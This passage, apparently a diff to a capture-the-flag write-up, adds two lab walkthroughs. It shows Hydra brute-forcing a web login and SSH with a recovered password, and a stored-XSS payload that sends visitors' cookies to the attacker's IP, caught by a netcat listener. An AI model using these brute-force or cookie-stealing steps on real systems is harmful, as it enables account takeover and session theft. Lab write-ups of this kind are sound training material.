@@ -203,6 +203,110 @@ Answer
 
 ## Day 17: Hydra-ha-ha-haa
 
+scan the target
+
+```
+nmap -A -T4 10.10.89.63
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210311397-50ed66d9-b6b3-46cc-a01a-7322b699a27a.png)
+
+there is a hydra challenge at /login
+
+![image](https://user-images.githubusercontent.com/90561566/210311514-3820fffb-0717-4ab4-a73c-cf1d7b5a4414.png)
+
+catch request from devtool
+
+![image](https://user-images.githubusercontent.com/90561566/210311677-26420160-5203-49f1-8b8a-5e1ff5b33648.png)
+
+bruteforce with hydra
+
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.89.63 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210312100-aa796a1c-6388-4c51-b60d-11e10353f97a.png)
+
+after login, you found your flag
+
+![image](https://user-images.githubusercontent.com/90561566/210312147-d0a25810-0e99-4ed8-a460-f0c3d54bef5e.png)
+
+bruteforce ssh
+
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.89.63 -V -f
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210312268-019b7ec0-7740-4465-8f70-0e6b6c661678.png)
+
+```
+ssh molly@10.10.89.63
+butterfly
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210312356-0d2fe8b7-dcff-4654-91de-6a51fdbc3f99.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/210312442-50efefa1-1081-4439-8169-7d457bf75c5d.png)
+
+## Day 18: ELF JS
+
+view the webpage at port 3000
+
+![image](https://user-images.githubusercontent.com/90561566/210314235-4234366a-4f13-4b17-92a3-e1fea17f4cbd.png)
+
+register one and login, we found a forum and see can comment here
+
+![image](https://user-images.githubusercontent.com/90561566/210314327-e0d8f182-fcf7-4dca-a85d-fa1ebfdac86e.png)
+
+test XSS
+
+```
+<script>alert(1)</script>
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210314495-b20bcbef-9309-4562-a0c4-c6400f5cf838.png)
+
+Cool, we can exploit an XSS vulnerability in the comment box to inject malicious Javascript into the database!
+
+```
+<script>window.location='http://10.8.0.74/?cookie='+document.cookie</script>
+```
+
+by doing that, anyone login to the website (include admin) will connect to our machine ip with their cookie
+
+now exit the forum and open netcat
+
+```
+nc -vlnp 80
+```
+
+after a while, admin logged in
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/210316719-d53946c2-5b77-4d2a-a5f3-918d6e435d31.png)
+
+## Day 19: Commands
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
